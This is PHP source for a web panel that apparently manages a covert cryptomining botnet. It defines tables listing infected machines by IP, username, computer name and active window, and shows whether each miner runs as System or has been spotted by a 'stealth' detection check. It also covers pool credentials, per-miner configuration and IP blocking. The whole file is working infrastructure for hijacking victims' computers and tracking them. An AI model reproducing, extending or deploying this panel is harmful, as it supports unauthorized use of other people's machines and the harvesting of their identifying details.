<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
require_once 'templates.php';

$datatables = [
    'tables'=>[
        'miner-table'=>[
            'db_table'=>'miners',
            'db_primary_key'=>'ms_minerID',
            'enabled'=>true,
            'columns'=>[
                [
                    'db_column'=>'ms_minerID',
                    'display'=>$larr['miner'].' ID'
                ],
                [
                    'db_column'=>'ms_uqhash',
                    'display'=>$larr['unique_id']
                ],
                [
                    'db_column'=>'ms_ip',
                    'display'=>'IP'
                ],
                [
                    'db_column'=>'ms_stealthfound',
                    'hidden'=>true
                ],
                [
                    'db_column'=>'ms_status',
                    'display'=>$larr['status'],
                    'formatter'=>function($d, $s){
                        global $larr;
                        $offline = isset($s['ms_lastConnection']) && ((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])) > 180);
                        $status = unamMinerStatus($offline ? -1 : (empty($s['ms_pool']) && $d != 6 ? 7 : $d));
                        if($offline) {
                            $status .= '<span class="text-status-red">('.unamTimeFormat((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])), true).')</span>';
                        }
                        if($d == 4) {
                            $status = str_replace('{REASON}', !empty($s['ms_stealthfound']) ? $s['ms_stealthfound'] : $larr['unknown'], $status);
                        }
                        return $status;
                    }
                ],
                [
                    'db_column'=>'ms_algorithm',
                    'display'=>$larr['algorithm']
                ],
                [
                    'db_column'=>'ms_hashrate',
                    'display'=>$larr['hashrate'],
                    'formatter'=>function($d){
                        return unamFormatHashrate($d);
                    }
                ],
                [
                    'db_column'=>'ms_pool',
                    'display'=>$larr['pool'],
                    'formatter'=>function($d){
                        global $larr;
                        return  empty($d) ? "<span class='text-status-red'>{$larr['pool_connection_error']}</span>" : $d;
                    }
                ],
                [
                    'db_column'=>'ms_port',
                    'display'=>$larr['port']
                ],
                [
                    'db_column'=>'ms_user',
                    'display'=>$larr['user']
                ],
                [
                    'db_column'=>'ms_worker',
                    'display'=>$larr['worker']
                ],
                [
                    'db_column'=>'ms_password',
                    'display'=>$larr['password']
                ],
                [
                    'db_column'=>'ms_username',
                    'display'=>$larr['username']
                ],
                [
                    'db_column'=>'ms_computername',
                    'display'=>$larr['computer_name']
                ],
                [
                    'db_column'=>'ms_type',
                    'display'=>$larr['type'],
                    'formatter'=>function($d){
                        global $larr;
                        return $d == 'xmrig' ? 'CPU Miner' : ($d == 'ethminer' ? 'GPU Miner' : $larr['unknown']);
                    }
                ],
                [
                    'db_column'=>'ms_version',
                    'display'=>$larr['version']
                ],
                [
                    'db_column'=>'ms_gpu',
                    'display'=>'GPU'
                ],
                [
                    'db_column'=>'ms_cpu',
                    'display'=>'CPU'
                ],
                [
                    'db_column'=>'ms_activewindow',
                    'display'=>$larr['active_window'],
                    'formatter'=>function($d){
                        global $larr;
                        return $d == 'Running as System' ? $larr['running_as_system']: $d;
                    }
                ],
                [
                    'db_column'=>'ms_runtime',
                    'display'=>$larr['run_time'],
                    'formatter'=>function($d){
                        return unamTimeFormat($d, false);
                    }
                ],
                [
                    'db_column'=>'ms_remoteURL',
                    'display'=>"{$larr['remote']} {$larr['url']}"
                ],
                [
                    'db_column'=>'ms_extra',
                    'display'=>$larr['extra_data']
                ],
                [
                    'db_column'=>'ms_lastConnection',
                    'display'=>$larr['last_connection'],
                ],
                [
                    'db_column'=>'ms_creationDate',
                    'display'=>$larr['first_connection'],
                ],
                [
                    'db_column'=>'ms_minerID',
                    'display'=>$larr['hashrate_history'],
                    'hidden'=>!$config['hashrate_history'],
                    'formatter'=>function($d){
                        global $larr;
                        return "<span><a href='#' class='btn btn-primary hashrate-history' data-index='{$d}'>{$larr['view']}</a></span>";
                    }
                ],
                [
                    'db_column'=>'ms_config',
                    'display'=>$larr['configuration'],
                    'formatter'=>function($d, $s){
                        global $larr;
                        $configs = getMinerConfigurations();
                        $configOptions = "<option value='0'>{$larr['none']}</option>";
                        foreach ($configs as $configdata) {
                            $configOptions .= "<option value='{$configdata['cf_configID']}' " . ($configdata['cf_configID'] == $d ? 'selected' : '') . ">".$configdata['cf_name']."</option>";
                        }
                        return "<select class='form-control select-miner-config' data-index='{$s['ms_minerID']}'>{$configOptions}</select>";
                    }
                ],
                [
                    'db_column'=>'ms_minerID',
                    'display'=>$larr['actions'],
                    'formatter'=>function($d, $s){
                        global $larr;
                        return "<div class='btn-group'><a href='#' class='btn btn-black ajax-action' data-action='ipblock-add' data-index='{$s['ms_ip']}'>{$larr['block_ip']}</a><a href='#' class='btn btn-danger ajax-action-confirm ajax-action-refresh' data-action='miner-remove' data-index='{$d}'>{$larr['remove']} {$larr['miner']}</a></div>";
                    }
                ]
            ]
        ],
        'ipblocking-table'=>[
            'db_table'=>'ipblocking',
            'db_primary_key'=>'ipb_blockID',
            'enabled'=>true,
            'columns'=>[
                [
                    'db_column'=>'ipb_blockID',
                    'display'=>'ID'
                ],
                [
                    'db_column'=>'ipb_ip',
                    'display'=>'IP'
                ],
                [
                    'db_column'=>'ipb_note',
                    'display'=>$larr['note'],
                    'formatter'=>function($d){
                        return nl2br($d);
                    }
                ],
                [
                    'db_column'=>'ipb_datetime',
                    'display'=>$larr['date']
                ],
                [
                    'db_column'=>'ipb_blockID',
                    'display'=>$larr['actions'],
                    'formatter'=>function($d){
                        global $larr;
                        return "<a href='#' class='btn btn-danger ajax-action-confirm ajax-action-refresh' data-action='ipblock-remove' data-index='{$d}'>{$larr['remove']}</a>";
                    }
                ]
            ]
        ]
    ]
];

function generateDatatable($id) {
    global $larr, $datatables;
    if(!empty($datatables['tables'][$id])) {
        $tabledata = [];
        foreach ($datatables['tables'][$id]['columns'] as $column) {
            if (!isset($column['hidden']) || !$column['hidden']) {
                $tabledata['display'][] = $column['display'];
            }
        }

        $columns = implode('</th><th>', $tabledata['display']);
        return "<div class='hook-datatable container-fluid' data-tableid='{$id}'>
                    <table class='table table-bordered table-hover' id='{$id}'>
                        <thead>
                        <tr>
                            <th>{$columns}</th>
                        </tr>
                        </thead>
                    </table>
                </div>";
    }
    return "Datatable '{$id}' not found.";
}